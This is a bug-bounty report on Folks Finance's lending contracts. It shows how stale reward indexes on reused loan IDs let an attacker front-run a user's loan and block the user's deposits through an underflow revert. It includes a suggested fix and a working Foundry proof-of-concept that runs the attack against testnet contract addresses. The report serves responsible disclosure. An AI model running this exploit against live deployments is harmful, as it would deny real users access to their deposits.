# Boost \_ Folks Finance 33970 - \[Smart Contract - Medium] User deposits can be blocked

Submitted on Sat Aug 03 2024 01:56:26 GMT-0400 (Atlantic Standard Time) by @JCN2023 for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33970

Report type: Smart Contract

Report severity: Medium

Target: <https://testnet.snowtrace.io/address/0x2cAa1315bd676FbecABFC3195000c642f503f1C9>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

Currently there are two `loanTypeIds` (1, 2) for each `poolId`. Therefore, there are two `loanPools` available for each pool, since a `loanPool` is defined as `loanPool = (loanTypeId, poolId)`. Activity will vary across the `loanPools` for a specific `poolId` and thus the `collateralRewardIndex` for these `loanPools` will vary (one will be greater than the other). At the time of writing this report, `loanTypeId 1` for `poolIds` 128 & 129 (USDC & AVAX) point to a `loanPool = (1, 128/129)` that has a smaller `collateralRewardIndex` compared to `loanPool = (2, 128/129)`. This, coupled with the fact that `loanIds` are reusable (can be created and deleted) and can hold values from previous usage, allows a bad actor to block users from depositing into certain pools via the following actions:

1. Create loan using user's specified `loanId` (seen in mempool), but specifying a `loanTypeId` that points to a `loanPool` that has a larger `collateralRewardIndex`
2. Deposit into `loanPool` so that the local `_userLoans[loanId].collaterals[poolId].rewardIndex` gets set to the global `loanPool.reward.collateralRewardIndex` value
3. Withdraw all funds from pool
4. Delete loan to free up `loanId`, but local index for `loanId` and `poolId` persists
5. User creates loan with `loanId` for `loanTypeId` corresponding to smaller global index for different `loanPool`
6. User attempts to deposit into `loanPool`, but tx reverts due to underflow when updating user's collateral rewards, since `local_index > global_index`

Conditions: The user's `createLoan` transaction has to specify a `loanTypeId` that results in a `loanPool` (when taking into account `poolIds`) which has a smaller `collateralRewardIndex` compared to other `loanPools` for other `loanTypeIds` (used by bad actor).

## Bug Description

A loan is identified by a `loanId` and holds the following data:

[LoanManagerState.sol](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/LoanManagerState.sol#L65-L93)

```solidity
65:    struct UserLoanCollateral {
66:        uint256 balance; // denominated in f token
67:        uint256 rewardIndex; // @audit: local index
68:    }
...
85:    struct UserLoan {
86:        bool isActive;
87:        bytes32 accountId;
88:        uint16 loanTypeId;
89:        uint8[] colPools;
90:        uint8[] borPools;
91:        mapping(uint8 poolId => UserLoanCollateral) collaterals;
92:        mapping(uint8 poolId => UserLoanBorrow) borrows;
93:    }
```

When a loan is deleted, it is first verified that the loan is empty but only the collateral and borrow positions arrays are validated to be empty (see line 66 below). Additionally, the `delete` keyword is used to reset all of the values in the `UserLoan` struct for this `loanId` (see line 69 below). However, the `delete` keyword [does not have an effect on mappings](https://docs.soliditylang.org/en/v0.8.26/types.html#delete) and therefore its possible that the `collaterals` mapping for a loan will still hold `UserLoanCollateral` values that were previously stored for a specified `poolId` key, even after the loan is deleted.

[LoanManager::deleteUserLoan](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/LoanManager.sol#L60-L69)

```solidity
60:    function deleteUserLoan(bytes32 loanId, bytes32 accountId) external override onlyRole(HUB_ROLE) nonReentrant {
61:        // check user loan active and account owner
62:        if (!isUserLoanActive(loanId)) revert UnknownUserLoan(loanId);
63:        if (!isUserLoanOwner(loanId, accountId)) revert NotAccountOwner(loanId, accountId);
64:
65:        // ensure loan is empty
66:        if (!_isUserLoanEmpty(loanId)) revert LoanNotEmpty(loanId); // @audit: considered empty if positions arrays are empty, other dynamic types not checked
67:
68:        // delete by setting isActive to false
69:        delete _userLoans[loanId]; // delete has no effect on mappings: https://docs.soliditylang.org/en/v0.8.26/types.html#delete
```

[LoanManagerState::\_isUserLoanEmpty](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/LoanManagerState.sol#L453-L454)

```solidity
453:    function _isUserLoanEmpty(bytes32 loanId) internal view returns (bool) {
454:        return _userLoans[loanId].colPools.length == 0 && _userLoans[loanId].borPools.length == 0;
```

To understand why this can be an issue, we will observe the flow for `deposit` transaction:

[LoanManagerLogic::executeDeposit](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/logic/LoanManagerLogic.sol#L66-L97)

```solidity
66:    function executeDeposit(
67:        mapping(bytes32 => LoanManagerState.UserLoan) storage userLoans,
68:        mapping(uint16 loanTypeId => LoanManagerState.LoanType) storage loanTypes,
69:        mapping(uint8 => IHubPool) storage pools,
70:        mapping(bytes32 accountId => mapping(uint8 poolId => LoanManagerState.UserPoolRewards)) storage userPoolRewards,
71:        DataTypes.ExecuteDepositParams memory params
72:    ) external {
73:        LoanManagerState.UserLoan storage userLoan = userLoans[params.loanId]; // @audit: defined by loanId
74:        LoanManagerState.LoanType storage loanType = loanTypes[userLoan.loanTypeId];
75:        LoanManagerState.LoanPool storage loanPool = loanType.pools[params.poolId]; // @audit: defined by (loanType, poolId)
...
97:        RewardLogic.updateUserCollateralReward(userPoolRewards, userLoan, loanPool, params.poolId); // @audit: update user rewards based on indexes
```

[RewardLogic::updateUserCollateralReward](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/logic/RewardLogic.sol#L20-L36)

```solidity
20:    function updateUserCollateralReward(
21:        mapping(bytes32 accountId => mapping(uint8 poolId => LoanManagerState.UserPoolRewards)) storage userPoolRewards,
22:        LoanManagerState.UserLoan storage loan,
23:        LoanManagerState.LoanPool storage loanPool,
24:        uint8 poolId
25:    ) internal {
26:        LoanManagerState.UserPoolRewards storage userLoanPoolRewards = userPoolRewards[loan.accountId][poolId];
27:        LoanManagerState.UserLoanCollateral storage userLoanCollateral = loan.collaterals[poolId];
28:        uint256 collateralRewardIndex = loanPool.reward.collateralRewardIndex; // @audit: global index 
29:
30:        userLoanPoolRewards.collateral += MathUtils.calcAccruedRewards(
31:            userLoanCollateral.balance,
32:            collateralRewardIndex, // @audit: global index for loanPool, defined by (loanTypeId, poolId)
33:            userLoanCollateral.rewardIndex // @audit: local index for user's UserLoanCollateral, defined by poolId
34:        );
35:
36:        userLoanCollateral.rewardIndex = collateralRewardIndex;
```

[MathUtils::calcAccruedRewards](https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/libraries/MathUtils.sol#L556-L561)

```solidity
556:    function calcAccruedRewards(
557:        uint256 amount,
558:        uint256 rewardIndexAtT,
559:        uint256 rewardIndexAtT_1
560:    ) internal pure returns (uint256) {
561:        return Math.mulDiv(amount, rewardIndexAtT - rewardIndexAtT_1, MathUtils.ONE_18_DP); // @audit: global_index - local_index
```

As we can see above, when updating the user's collateral rewards during `deposits`, the global index for a `loanPool` is defined by a `loanTypeId` and `poolId` pair. I.e. `loanPool = (1, 128)` will have a different global index compared to `loanPool = (2, 128)`. However, the local index for the user is defined only by the `poolId`. Therefore, this local index can be implicitly pointing to a `loanPool` with `loanTypeId` of 1 or 2. It is assumed that the local index will be consistent with the `UserLoan.loanTypeId` value that is specified for the created loan (and therefore consistent with the global index for a `loanTypeId`, `poolId` pair). However, we have already seen that the local index for a loan can persist after deletion. Therefore, the following situation can arise:

* global index for `loanPool = (1, 128)` is `x`
* global index for `loanPool = (2, 128)` is `x + 1`
* Loan is created with `loanId` and `loanTypeId = 2`.
* `poolId = 128` is deposited into, setting the loan's local index for `poolId = 128` to `x + 1`
* loan is emptied (all collateral withdrawn) and deleted
* New loan is created with `loanId` and `loanTypeId = 1`
* Current local index for loan and `poolId = 128` is `x + 1`, but global index for `(loanTypeId, poolId)` is `x`

After the above situation occurs, when the user attempts to deposit into `poolId = 128` with the new loan, the transaction will revert on line 561 in `MathUtils.sol`. This is due to the fact that the global index for the `loanPool = (1, 128)` is `x`, which is less than the local index for the new loan and poolId (`x + 1`). Thus, the `rewardIndexAtT - rewardIndexAtT_1` operation will result in an underflow.

## Impact

A bad actor is able to block users from depositing into certain pools. This exploit can only occur against users who are creating loans with `loanTypeIds` that correspond to `loanPools` with a smaller `collateralRewardIndex` compared to other `loanTypeIds`. Currently, the loan pools `(1, 128) & (1, 129)` have smaller `collateralRewardIndex` compared to the loan pools `(2, 128) & (2, 129)`. Therefore, any user who creates a loan with `loanTypeId = 1` and wishes to deposit into pool `128 or 129`, can be blocked by this exploit.

Note that the above pools were specified in this report (and in the below POC) for simplification since those pools can be directly interacted with via the Hub chain (single chain). There are other pools that are available via spoke chains in which this exploit can also be executed from, but this would entail cross chain communication, which is difficult to comprehensively test.

## Recommended Mitigation

Since `loanIds` can be reused by design, and `UserLoanCollateral` values for a specific `loanId` and `poolId` persist after deletion, I would recommend explicitly resetting the `UserLoanCollateral.rewardValue` to `0` when a user's collateral position is closed (all value withdrawn). An example implementation is as follows:

```diff
diff --git a/./contracts/hub/logic/UserLoanLogic.sol b/./contracts/hub/logic/UserLoanLogic.sol
index f0c0268..7ceb521 100644
--- a/./contracts/hub/logic/UserLoanLogic.sol
+++ b/./contracts/hub/logic/UserLoanLogic.sol
@@ -34,6 +34,7 @@ library UserLoanLogic {

         // if the balance is now zero, remove pool from list of user loan collaterals
         if (loan.collaterals[poolId].balance == 0) {
+            loan.collaterals[poolId].rewardIndex = 0;
             uint256 colPoolsLength = loan.colPools.length;
             for (uint8 i = 0; i < colPoolsLength; ) {
                 if (loan.colPools[i] == poolId) {
```

## Proof of concept

## Proof of Concept

For simplicity, the below POC only showcases a bad actor griefing a user who wishes to deposit into pools that are directly accessible via the Hub chain. However, note that as long as the conditions outlined in the `Impacts` section are met, this griefing attack is also possible for pools that are only accessible from different chains via cross-chain transactions.

To run foundry POC:

* add test file to `test/` directory of a foundry repo
* add `AVAX_FUJI_RPC_URL` variable as environment var or in `.env` file
* run test with `forge test --mc FolksPOC_GriefUserDeposits`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IHUB {
    function loanManager() external view returns (address);
}

interface IHubAdapter {
    function sequence() external view returns (uint256);
}

interface ISpoke {
    struct MessageParams {
        uint16 adapterId; 
        uint16 returnAdapterId; 
        uint256 receiverValue; 
        uint256 gasLimit; 
        uint256 returnGasLimit; 
    }
    
    function poolId() external view returns (uint8);
    function deposit(MessageParams memory params, bytes32 accountId, bytes32 loanId, uint256 amount) external payable;
    function createAccount(MessageParams memory params, bytes32 accountId, bytes32 refAccountId) external payable;
    function createLoan(MessageParams memory params, bytes32 accountId, bytes32 loanId, uint16 loanTypeId, bytes32 loanName) external payable;
    function createLoanAndDeposit(MessageParams memory params, bytes32 accountId, bytes32 loanId, uint256 amount, uint16 loanTypeId, bytes32 loanName) external payable;
    function withdraw(MessageParams memory params, bytes32 accountId, bytes32 loanId, uint8 poolId, uint16 chainId, uint256 amount, bool isFAmount) external payable;
    function deleteLoan(MessageParams memory params, bytes32 accountId, bytes32 loanId) external payable;
}

interface ILoanManager {
    struct LoanPool {
        uint256 collateralUsed; 
        uint256 borrowUsed; 
        uint64 collateralCap; 
        uint64 borrowCap; 
        uint16 collateralFactor; 
        uint16 borrowFactor; 
        uint16 liquidationBonus; 
        uint16 liquidationFee; 
        bool isAdded;
        bool isDeprecated;
        LoanPoolReward reward;
    }

    struct LoanPoolReward {
        uint64 lastUpdateTimestamp;
        uint256 minimumAmount; 
        uint256 collateralSpeed; 
        uint256 borrowSpeed; 
        uint256 collateralRewardIndex; 
        uint256 borrowRewardIndex; 
    }

    function getLoanPool(uint16 loanTypeId, uint8 poolId) external view returns (LoanPool memory);
}

contract FolksPOC_GriefUserDeposits is Test {
    uint256 avaxTestnetFork;

    string AVAX_FUJI_RPC_URL = vm.envString("AVAX_FUJI_RPC_URL");

    address constant USDC = 0x5425890298aed601595a70AB815c96711a31Bc65;

    address constant HUB_ADAPTER = 0xf472ab58969709De9FfEFaeFFd24F9e90cf8DbF9;

    address constant HUB = 0xaE4C62510F4d930a5C8796dbfB8C4Bc7b9B62140;

    address constant SPOKE_COMMON = 0x6628cE08b54e9C8358bE94f716D93AdDcca45b00;

    address constant SPOKE_CIRCLE_TOKEN = 0x89df7db4af48Ec7A84DE09F755ade9AF1940420b;

    address constant SPOKE_GAS_TOKEN = 0xBFf8b4e5f92eDD0A5f72b4b0E23cCa2Cc476ce2a;

    event MessageFailed(uint16 adapterId, bytes32 indexed messageId, bytes reason);

    function setUp() public {
        avaxTestnetFork = vm.createFork(AVAX_FUJI_RPC_URL);

        vm.selectFork(avaxTestnetFork);
    }

    function testGriefUserDeposits() public {
        // fork block height for testing purposes
        //vm.rollFork(35161357);

        // set up user
        ISpoke.MessageParams memory params = ISpoke.MessageParams({ 
            adapterId: 1,
            returnAdapterId: 1,
            receiverValue: 0,
            gasLimit: 0,
            returnGasLimit: 0
        });

        address user = address(0x1111);
        deal(USDC, user, 100e6);
        vm.deal(user, 1 ether);

        bytes32 accountIdUser = keccak256(abi.encodePacked(user));
        vm.prank(user);
        ISpoke(SPOKE_COMMON).createAccount(params, accountIdUser, bytes32(0));

        // set up bad actor
        address badActor = address(0x69420);
        deal(USDC, badActor, 100e6);
        vm.deal(badActor, 1 ether);

        bytes32 accountIdBadActor = keccak256(abi.encodePacked(badActor));
        vm.prank(badActor);
        ISpoke(SPOKE_COMMON).createAccount(params, accountIdBadActor, bytes32(0));

        // conditions: 
        // - User creates loan for loanTypeId_1. For simple, single chain POC, user can deposit into two poolIds directly on Hub chain: 128, 129.
        // - loan pools for loanTypeId_1 have a smaller collateralRewardIndex than loan pools for loanTypeId_2 (user can be griefed if they choose loanType with smaller index)
        bytes32 loanId = keccak256(abi.encodePacked(user, accountIdUser));
        uint16 loanTypeId_1 = 1;

        ILoanManager loanManager = ILoanManager(IHUB(HUB).loanManager());
        // verify loan pools state (reward indexes)
        _verifyLoanPoolsState(loanManager);

        // bad actor front-runs tx and sets the collateral rewardIndex associated with the the loanId
        // bad actor creates loan for loanTypeId_2 and deposits into both pools (128, 129), withdraws all funds, deletes loan to free up loanId
        vm.startPrank(badActor);
        IERC20(USDC).approve(SPOKE_CIRCLE_TOKEN, 100e6);
        
        // create loan for loanTypeId_2 and deposit into poolId 128 (USDC) to set reward index 
        uint256 fTokenStart = loanManager.getLoanPool(2, 128).collateralUsed;

        ISpoke(SPOKE_CIRCLE_TOKEN).createLoanAndDeposit(params, accountIdBadActor, loanId, 100e6, uint16(2), bytes32(0));

        uint256 fTokenEnd = loanManager.getLoanPool(2, 128).collateralUsed;
        
        // withdraw from poolId 128 (USDC)
        ISpoke(SPOKE_COMMON).withdraw(params, accountIdBadActor, loanId, 128, 1, fTokenEnd - fTokenStart, true);

        // deposit into poolId 129 (AVAX) to set reward index
        fTokenStart = loanManager.getLoanPool(2, 129).collateralUsed;

        ISpoke(SPOKE_GAS_TOKEN).deposit{value: 1 ether}(params, accountIdBadActor, loanId, 1 ether);

        fTokenEnd = loanManager.getLoanPool(2, 129).collateralUsed;
        
        // withdraw from poolId 129 (AVAX)
        ISpoke(SPOKE_COMMON).withdraw(params, accountIdBadActor, loanId, 129, 1, fTokenEnd - fTokenStart, true);
        
        // delete loan to free up loanId
        ISpoke(SPOKE_COMMON).deleteLoan(params, accountIdBadActor, loanId);

        vm.stopPrank();

        // user's `createLoan` transaction executes
        vm.prank(user);
        ISpoke(SPOKE_COMMON).createLoan(params, accountIdUser, loanId, loanTypeId_1, bytes32(0));

        // user attempts to deposit into pools, but deposits reverts due to underflow
        bytes32 messageId = keccak256(abi.encodePacked(bytes32("HUB_ADAPTER_V1"), IHubAdapter(HUB_ADAPTER).sequence()));

        vm.startPrank(user);
        IERC20(USDC).approve(SPOKE_CIRCLE_TOKEN, 100e6);
        
        // user can not deposit into poolId 128 (USDC)
        vm.expectEmit(true, false, false, true);
        emit MessageFailed(
            params.adapterId, 
            messageId, 
            abi.encodeWithSelector(bytes4(keccak256("Panic(uint256)")), uint256(0x11)) // error code 0x11 is underflow error
        ); 
        ISpoke(SPOKE_CIRCLE_TOKEN).deposit(params, accountIdUser, loanId, 100e6);

        // user can not deposit into poolId 129 (AVAX)
        messageId = keccak256(abi.encodePacked(bytes32("HUB_ADAPTER_V1"), IHubAdapter(HUB_ADAPTER).sequence()));
        vm.expectEmit(true, false, false, true);
        emit MessageFailed(
            params.adapterId, 
            messageId, 
            abi.encodeWithSelector(bytes4(keccak256("Panic(uint256)")), uint256(0x11)) // error code 0x11 is underflow error
        ); 
        ISpoke(SPOKE_GAS_TOKEN).deposit{value: 1 ether}(params, accountIdUser, loanId, 1 ether);

        vm.stopPrank();
    }

    function _verifyLoanPoolsState(ILoanManager loanManager) internal {
        // poolId 128 (USDC)
        uint256 collateralRewardIndex_loanType_1_poolId_128 = loanManager.getLoanPool(1, 128).reward.collateralRewardIndex;
        uint256 collateralRewardIndex_loanType_2_poolId_128 = loanManager.getLoanPool(2, 128).reward.collateralRewardIndex;

        assertGt(collateralRewardIndex_loanType_2_poolId_128, collateralRewardIndex_loanType_1_poolId_128);
        
        // poolId 129 (AVAX)
        uint256 collateralRewardIndex_loanType_1_poolId_129 = loanManager.getLoanPool(1, 129).reward.collateralRewardIndex;
        uint256 collateralRewardIndex_loanType_2_poolId_129 = loanManager.getLoanPool(2, 129).reward.collateralRewardIndex;

        assertGt(collateralRewardIndex_loanType_2_poolId_129, collateralRewardIndex_loanType_1_poolId_129);
    }
}
```
